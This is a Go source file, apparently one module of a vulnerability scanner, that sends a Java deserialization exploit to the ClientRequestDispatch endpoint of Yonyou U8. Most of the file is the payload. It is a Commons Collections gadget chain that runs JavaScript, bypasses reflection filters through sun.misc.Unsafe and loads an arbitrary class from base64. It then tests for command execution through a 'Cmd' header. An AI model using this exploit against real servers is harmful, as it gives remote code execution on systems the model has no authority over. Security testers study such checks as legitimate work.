package U8_ClientRequestDispatch

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io/ioutil"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url = url + "/service/~iufo/nc.ui.iufo.jiuqi.ClientRequestDispatch"
	data := "{{unquote(\"\\xac\\xed\\x00\\x05sr\\x00\\x11java.util.HashSet\\xbaD\\x85\\x95\\x96\\xb8\\xb74\\x03\\x00\\x00xpw\\x0c\\x00\\x00\\x00\\x02?@\\x00\\x00\\x00\\x00\\x00\\x01sr\\x004org.apache.commons.collections.keyvalue.TiedMapEntry\\x8a\\xad\\xd2\\x9b9\\xc1\\x1f\\xdb\\x02\\x00\\x02L\\x00\\x03keyt\\x00\\x12Ljava/lang/Object;L\\x00\\x03mapt\\x00\\x0fLjava/util/Map;xpt\\x00\\x03foosr\\x00*org.apache.commons.collections.map.LazyMapn\\xe5\\x94\\x82\\x9ey\\x10\\x94\\x03\\x00\\x01L\\x00\\x07factoryt\\x00,Lorg/apache/commons/collections/Transformer;xpsr\\x00:org.apache.commons.collections.functors.ChainedTransformer0\\xc7\\x97\\xec\\x28z\\x97\\x04\\x02\\x00\\x01[\\x00\\x0diTransformerst\\x00-[Lorg/apache/commons/collections/Transformer;xpur\\x00-[Lorg.apache.commons.collections.Transformer;\\xbdV*\\xf1\\xd84\\x18\\x99\\x02\\x00\\x00xp\\x00\\x00\\x00\\x04sr\\x00;org.apache.commons.collections.functors.ConstantTransformerXv\\x90\\x11A\\x02\\xb1\\x94\\x02\\x00\\x01L\\x00\\x09iConstantq\\x00~\\x00\\x03xpvr\\x00 javax.script.ScriptEngineManager\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00xpsr\\x00:org.apache.commons.collections.functors.InvokerTransformer\\x87\\xe8\\xffk\\x7b|\\xce8\\x02\\x00\\x03[\\x00\\x05iArgst\\x00\\x13[Ljava/lang/Object;L\\x00\\x0biMethodNamet\\x00\\x12Ljava/lang/String;[\\x00\\x0biParamTypest\\x00\\x12[Ljava/lang/Class;xpur\\x00\\x13[Ljava.lang.Object;\\x90\\xceX\\x9f\\x10s\\x29l\\x02\\x00\\x00xp\\x00\\x00\\x00\\x00t\\x00\\x0bnewInstanceur\\x00\\x12[Ljava.lang.Class;\\xab\\x16\\xd7\\xae\\xcb\\xcdZ\\x99\\x02\\x00\\x00xp\\x00\\x00\\x00\\x00sq\\x00~\\x00\\x13uq\\x00~\\x00\\x18\\x00\\x00\\x00\\x01t\\x00\\x02jst\\x00\\x0fgetEngineByNameuq\\x00~\\x00\\x1b\\x00\\x00\\x00\\x01vr\\x00\\x10java.lang.String\\xa0\\xf0\\xa48z;\\xb3B\\x02\\x00\\x00xpsq\\x00~\\x00\\x13uq\\x00~\\x00\\x18\\x00\\x00\\x00\\x01t45try \\x7b\\x0a  load\\x28\\\"nashorn:mozilla_compat.js\\\"\\x29;\\x0a\\x7d catch \\x28e\\x29 \\x7b\\x7d\\x0afunction getUnsafe\\x28\\x29\\x7b\\x0a  var theUnsafeMethod = java.lang.Class.forName\\x28\\\"sun.misc.Unsafe\\\"\\x29.getDeclaredField\\x28\\\"theUnsafe\\\"\\x29;\\x0a  theUnsafeMethod.setAccessible\\x28true\\x29; \\x0a  return theUnsafeMethod.get\\x28null\\x29;\\x0a\\x7d\\x0afunction removeClassCache\\x28clazz\\x29\\x7b\\x0a  var unsafe = getUnsafe\\x28\\x29;\\x0a  var clazzAnonymousClass = unsafe.defineAnonymousClass\\x28clazz,java.lang.Class.forName\\x28\\\"java.lang.Class\\\"\\x29.getResourceAsStream\\x28\\\"Class.class\\\"\\x29.readAllBytes\\x28\\x29,null\\x29;\\x0a  var reflectionDataField = clazzAnonymousClass.getDeclaredField\\x28\\\"reflectionData\\\"\\x29;\\x0a  unsafe.putObject\\x28clazz,unsafe.objectFieldOffset\\x28reflectionDataField\\x29,null\\x29;\\x0a\\x7d\\x0afunction bypassReflectionFilter\\x28\\x29 \\x7b\\x0a  var reflectionClass;\\x0a  try \\x7b\\x0a    reflectionClass = java.lang.Class.forName\\x28\\\"jdk.internal.reflect.Reflection\\\"\\x29;\\x0a  \\x7d catch \\x28error\\x29 \\x7b\\x0a    reflectionClass = java.lang.Class.forName\\x28\\\"sun.reflect.Reflection\\\"\\x29;\\x0a  \\x7d\\x0a  var unsafe = getUnsafe\\x28\\x29;\\x0a  var classBuffer = reflectionClass.getResourceAsStream\\x28\\\"Reflection.class\\\"\\x29.readAllBytes\\x28\\x29;\\x0a  var reflectionAnonymousClass = unsafe.defineAnonymousClass\\x28reflectionClass, classBuffer, null\\x29;\\x0a  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField\\x28\\\"fieldFilterMap\\\"\\x29;\\x0a  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField\\x28\\\"methodFilterMap\\\"\\x29;\\x0a  if \\x28fieldFilterMapField.getType\\x28\\x29.isAssignableFrom\\x28java.lang.Class.forName\\x28\\\"java.util.HashMap\\\"\\x29\\x29\\x29 \\x7b\\x0a    unsafe.putObject\\x28reflectionClass, unsafe.staticFieldOffset\\x28fieldFilterMapField\\x29, java.lang.Class.forName\\x28\\\"java.util.HashMap\\\"\\x29.getConstructor\\x28\\x29.newInstance\\x28\\x29\\x29;\\x0a  \\x7d\\x0a  if \\x28methodFilterMapField.getType\\x28\\x29.isAssignableFrom\\x28java.lang.Class.forName\\x28\\\"java.util.HashMap\\\"\\x29\\x29\\x29 \\x7b\\x0a    unsafe.putObject\\x28reflectionClass, unsafe.staticFieldOffset\\x28methodFilterMapField\\x29, java.lang.Class.forName\\x28\\\"java.util.HashMap\\\"\\x29.getConstructor\\x28\\x29.newInstance\\x28\\x29\\x29;\\x0a  \\x7d\\x0a  removeClassCache\\x28java.lang.Class.forName\\x28\\\"java.lang.Class\\\"\\x29\\x29;\\x0a\\x7d\\x0afunction setAccessible\\x28accessibleObject\\x29\\x7b\\x0a    var unsafe = getUnsafe\\x28\\x29;\\x0a    var overrideField = java.lang.Class.forName\\x28\\\"java.lang.reflect.AccessibleObject\\\"\\x29.getDeclaredField\\x28\\\"override\\\"\\x29;\\x0a    var offset = unsafe.objectFieldOffset\\x28overrideField\\x29;\\x0a    unsafe.putBoolean\\x28accessibleObject, offset, true\\x29;\\x0a\\x7d\\x0afunction defineClass\\x28bytes\\x29\\x7b\\x0a  var clz = null;\\x0a  var version = java.lang.System.getProperty\\x28\\\"java.version\\\"\\x29;\\x0a  var unsafe = getUnsafe\\x28\\x29;\\x0a  var classLoader = new java.net.URLClassLoader\\x28java.lang.reflect.Array.newInstance\\x28java.lang.Class.forName\\x28\\\"java.net.URL\\\"\\x29, 0\\x29\\x29;\\x0a  try\\x7b\\x0a    if \\x28version.split\\x28\\\".\\\"\\x29[0] >= 11\\x29 \\x7b\\x0a      bypassReflectionFilter\\x28\\x29;\\x0a    defineClassMethod = java.lang.Class.forName\\x28\\\"java.lang.ClassLoader\\\"\\x29.getDeclaredMethod\\x28\\\"defineClass\\\", java.lang.Class.forName\\x28\\\"[B\\\"\\x29,java.lang.Integer.TYPE, java.lang.Integer.TYPE\\x29;\\x0a    setAccessible\\x28defineClassMethod\\x29;\\x0a    // \\xe7\\xbb\\x95\\xe8\\xbf\\x87 setAccessible \\x0a    clz = defineClassMethod.invoke\\x28classLoader, bytes, 0, bytes.length\\x29;\\x0a    \\x7delse\\x7b\\x0a      var protectionDomain = new java.security.ProtectionDomain\\x28new java.security.CodeSource\\x28null, java.lang.reflect.Array.newInstance\\x28java.lang.Class.forName\\x28\\\"java.security.cert.Certificate\\\"\\x29, 0\\x29\\x29, null, classLoader, []\\x29;\\x0a      clz = unsafe.defineClass\\x28null, bytes, 0, bytes.length, classLoader, protectionDomain\\x29;\\x0a    \\x7d\\x0a  \\x7dcatch\\x28error\\x29\\x7b\\x0a    error.printStackTrace\\x28\\x29;\\x0a  \\x7dfinally\\x7b\\x0a    return clz;\\x0a  \\x7d\\x0a\\x7d\\x0afunction base64DecodeToByte\\x28str\\x29 \\x7b\\x0a  var bt;\\x0a  try\\x7b\\x0a    bt = java.lang.Class.forName\\x28\\\"sun.misc.BASE64Decoder\\\"\\x29.newInstance\\x28\\x29.decodeBuffer\\x28str\\x29;\\x0a  \\x7dcatch\\x28e\\x29\\x7b\\x7d\\x0a  if \\x28bt == null\\x29\\x7b\\x0a    try\\x7b\\x0a      bt = java.lang.Class.forName\\x28\\\"java.util.Base64\\\"\\x29.newInstance\\x28\\x29.getDecoder\\x28\\x29.decode\\x28str\\x29;\\x0a    \\x7dcatch\\x28e\\x29\\x7b\\x7d\\x0a  \\x7d\\x0a  if\\x28bt == null\\x29\\x7b\\x0a    try\\x7b\\x0a      bt = java.util.Base64.getDecoder\\x28\\x29.decode\\x28str\\x29;\\x0a    \\x7dcatch\\x28e\\x29\\x7b\\x7d\\x0a  \\x7d\\x0a  if \\x28bt == null\\x29\\x7b\\x0a    bt = java.lang.Class.forName\\x28\\\"org.apache.commons.codec.binary.Base64\\\"\\x29.newInstance\\x28\\x29.decode\\x28str\\x29;\\x0a  \\x7d\\x0a  return bt;\\x0a\\x7d\\x0avar code=\\\"\\\";\\x0aclz = defineClass\\x28base64DecodeToByte\\x28code\\x29\\x29;clz.newInstance\\x28\\x29;t\\x00\\x04evaluq\\x00~\\x00\\x1b\\x00\\x00\\x00\\x01q\\x00~\\x00#sr\\x00\\x11java.util.HashMap\\x05\\x07\\xda\\xc1\\xc3\\x16`\\xd1\\x03\\x00\\x02F\\x00\\x0aloadFactorI\\x00\\x09thresholdxp?@\\x00\\x00\\x00\\x00\\x00\\x00w\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00xxx\")}}"
	resp, err := client.R().SetHeaders(map[string]string{
		"User-Agent":     UA,
		"Cmd":            "echo 123admin",
		"Content-Length": "16284",
		"Content-Type":   "application/x-www-form-urlencoded",
	}).SetBody(data).Post(url)
	if err != nil {
		color.Red.Println("[-] 请求失败或用友 U8 ClientRequestDispatch反序列化漏洞不存在")
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		color.Red.Println("[-] 读取响应体失败")
		return
	}

	// 检查状态码为200并且响应体中包含字符串"123admin"
	if resp.StatusCode == 200 && strings.Contains(string(body), "123admin") {
		color.Green.Println("[+] 用友 U8 ClientRequestDispatch反序列化漏洞存在 -> " + url)
		return
	}
	color.Red.Println("[-] 用友 U8 ClientRequestDispatch反序列化漏洞不存在")
}
